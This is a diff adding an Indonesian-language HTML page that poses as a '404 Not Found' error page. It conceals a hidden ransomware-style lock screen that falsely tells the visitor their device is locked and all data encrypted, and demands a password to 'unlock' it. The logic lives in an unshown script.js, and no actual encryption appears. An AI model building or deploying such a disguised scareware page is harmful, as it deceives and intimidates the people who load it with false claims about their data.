@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>404 Not Found</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div id="errorPage">
+    <h1>404 - Tautan Tidak Ditemukan</h1>
+    <p>Halaman ini mungkin telah dihapus atau dipindahkan.</p>
+  </div>
+
+  <!-- Layar ransomware -->
+  <div id="ransomScreen" style="display: none;">
+    <img src="icon.png" alt="Warning" class="ransom-icon" />
+    <h1 class="ransom-title">!! PERANGKAT ANDA TELAH TERKUNCI !!</h1>
+    <p class="ransom-message">
+      Semua data anda telah dienkripsi.<br />
+      Untuk membuka kunci, masukkan password dengan benar.
+    </p>
+    <input type="password" id="passwordInput" placeholder="Masukkan Password"/>
+    <button onclick="checkPassword()">UNLOCK</button>
+    <p class="author">By Kim</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
